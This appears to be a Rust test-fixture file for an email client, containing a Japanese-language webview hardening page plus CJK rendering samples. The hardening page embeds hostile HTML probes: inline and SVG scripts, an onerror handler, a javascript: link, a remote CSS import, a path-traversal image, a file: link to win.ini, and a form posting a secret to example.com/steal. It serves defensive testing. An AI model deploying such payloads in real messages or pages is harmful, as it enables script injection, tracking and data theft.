//! M0 spike documents. These deliberately bypass the sanitiser so that the
//! webview's own hardening (layer 3) is exercised in isolation.

use fuu_model::{ManifestEntry, ResourceManifest, SafeDocument};
use fuu_sanitiser::escape_html;

/// 1×1 red PNG.
const RED_PIXEL_B64: &str =
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==";

fn base64_decode(input: &str) -> Vec<u8> {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = Vec::with_capacity(input.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for byte in input.bytes() {
        let Some(value) = ALPHABET.iter().position(|&c| c == byte) else { continue };
        acc = (acc << 6) | value as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    out
}

const BASE_STYLE: &str = "<style>
:root { color-scheme: light dark; }
body { font: 14px/1.7 system-ui, 'Segoe UI', 'Hiragino Sans', 'Yu Gothic UI', 'Microsoft YaHei UI', 'Malgun Gothic', sans-serif; margin: 6px 40px 48px; }
table { border-collapse: collapse; } td, th { border: 1px solid #8884; padding: 4px 8px; text-align: left; }
code { font-family: ui-monospace, Consolas, Menlo, monospace; }
.ok { color: #2a8a3a; } .ng { color: #c0392b; font-weight: bold; }
</style>";

fn page(body: &str) -> String {
    format!("<!doctype html><html><head><meta charset=\"utf-8\">{BASE_STYLE}</head><body>{body}</body></html>")
}

/// Document full of things the webview must refuse. Every probe that succeeds
/// prints a red "NG" marker.
pub fn security_document() -> SafeDocument {
    let body = r#"
<h2>WebView 堅牢化の検査</h2>
<p>赤い <span class="ng">NG</span> が一つも見えなければ合格です。</p>
<table>
<tr><th>検査</th><th>結果</th></tr>
<tr><td>インラインスクリプト</td><td id="js">スクリプト未実行 <span class="ok">OK</span></td></tr>
<tr><td>onerror ハンドラー</td><td><img src="res/99" alt="" onerror="this.parentNode.innerHTML='<span class=ng>NG: onerror ran</span>'">発火しなければ OK</td></tr>
<tr><td>javascript: リンク</td><td><a href="javascript:document.body.innerHTML='NG'">クリックしても何も起きなければ OK</a></td></tr>
<tr><td>外部画像（追跡ピクセル）</td><td><img src="https://example.com/pixel.gif" width="1" height="1" alt="">読み込まれない（Blitz は拒否数 +1、WebView は CSP で遮断）</td></tr>
<tr><td>外部 CSS</td><td class="remotecss">文字が赤くならなければ OK</td></tr>
<tr><td>iframe</td><td><iframe src="https://example.com" width="120" height="40"></iframe> 空なら OK</td></tr>
<tr><td>CID 画像（manifest 0 番）</td><td><img src="res/0" width="24" height="24" style="image-rendering:pixelated" alt="cid"> 赤い四角が出れば OK</td></tr>
<tr><td>data: PNG</td><td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==" width="24" height="24" style="image-rendering:pixelated" alt="data"> 赤い四角が出れば OK</td></tr>
<tr><td>SVG リソース（manifest 1 番）</td><td><img src="res/1" width="24" height="24" alt="">表示されなければ OK（拒否数 +1）</td></tr>
<tr><td>パス走査</td><td><img src="../../../res/0" width="24" height="24" alt="">文書の外へは出られない（同じ文書内の画像に解決される）</td></tr>
<tr><td>フォーム送信</td><td><form action="https://example.com/steal" method="post"><input name="p" value="secret"><button>送信</button></form>送信できなければ OK</td></tr>
<tr><td>https リンク</td><td><a href="https://example.com/?from=fuu">example.com</a>（確認ダイアログが出れば OK）</td></tr>
<tr><td>target=_blank</td><td><a href="https://example.org/" target="_blank">新規ウィンドウ</a>（ウィンドウは開かず確認ダイアログ）</td></tr>
<tr><td>mailto リンク</td><td><a href="mailto:someone@example.com?subject=hello">someone@example.com</a>（作成画面が開けば OK）</td></tr>
<tr><td>file: リンク</td><td><a href="file:///C:/Windows/win.ini">win.ini</a>（何も起きなければ OK）</td></tr>
</table>
<script>document.getElementById('js').innerHTML = '<span class="ng">NG: script ran</span>';</script>
<style>@import url("https://example.com/evil.css"); .remotecss { background: url("https://example.com/bg.png"); }</style>
<link rel="stylesheet" href="https://example.com/evil.css">
"#;
    SafeDocument {
        html: page(body),
        text: "セキュリティ検査文書（テキスト表示では HTML の検査はできません）".into(),
        resources: ResourceManifest {
            entries: vec![
                ManifestEntry { mime: "image/png".into(), data: base64_decode(RED_PIXEL_B64) },
                ManifestEntry {
                    mime: "image/svg+xml".into(),
                    data: br#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="24" height="24" fill="red"/></svg>"#.to_vec(),
                },
            ],
        },
        flags: Default::default(),
    }
}

pub const CJK_TEXT: &str = "日本語：吾輩は猫である。名前はまだ無い。〜「かぎ括弧」『二重』…　全角スペース、半角ｶﾅ、①②③、㈱、髙﨑、𠮷野家
简体中文：电子邮件客户端，简洁而现代。
繁體中文：電子郵件用戶端，簡潔而現代。
한국어: 전자 메일 클라이언트, 간결하고 현대적입니다.
Emoji: ✉️ 📬 🗂️ 👍🏽 👨‍👩‍👧
English (British): colour, organise, centre.";

pub fn cjk_document() -> SafeDocument {
    let escaped: String = CJK_TEXT
        .lines()
        .map(|l| format!("<p>{}</p>", escape_html(l)))
        .collect();
    SafeDocument {
        html: page(&format!("<h2>CJK 表示サンプル（WebView）</h2>{escaped}<p>縦中横や禁則も確認：「、。」が行頭に来ないこと。長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い長い文。</p>")),
        text: CJK_TEXT.into(),
        resources: ResourceManifest::default(),
        flags: Default::default(),
    }
}

pub fn message_document(index: usize, subject: &str) -> SafeDocument {
    let text = format!("これはスパイク用のダミーメール #{index} です。\n\n件名: {subject}\n\nM2 以降は実際に IMAP から取得し、解析・無害化を経て表示します。");
    let html = page(&format!(
        "<p>{}</p>",
        escape_html(&text).replace('\n', "<br>")
    ));
    SafeDocument { html, text, resources: ResourceManifest::default(), flags: Default::default() }
}

#[cfg(test)]
mod tests {
    #[test]
    fn decodes_png_signature() {
        let bytes = super::base64_decode(super::RED_PIXEL_B64);
        assert_eq!(&bytes[..8], b"\x89PNG\r\n\x1a\n");
    }
}

#[cfg(test)]
mod hit_probe {
    use fuu_render::blitz::BlitzRenderer;
    use fuu_render::{BodyRenderer, Rect, RemoteContentPolicy};

    #[test]
    #[ignore]
    fn probe_links_in_security_document() {
        let mut r = BlitzRenderer::new(Box::new(|_| {}), Box::new(|_| {}));
        r.set_bounds(Rect { x: 0, y: 0, width: 800, height: 600 }).unwrap();
        r.show(&super::security_document(), RemoteContentPolicy::Block).unwrap();
        for y in (0..900).step_by(30) {
            let row: String = (0..800).step_by(40).map(|x| if r.hover(x as f32, y as f32) == fuu_render::Cursor::Pointer { '#' } else { '.' }).collect();
            println!("{y:4} {row} {:?}", r.debug_href_at(400.0, y as f32));
        }
    }
}
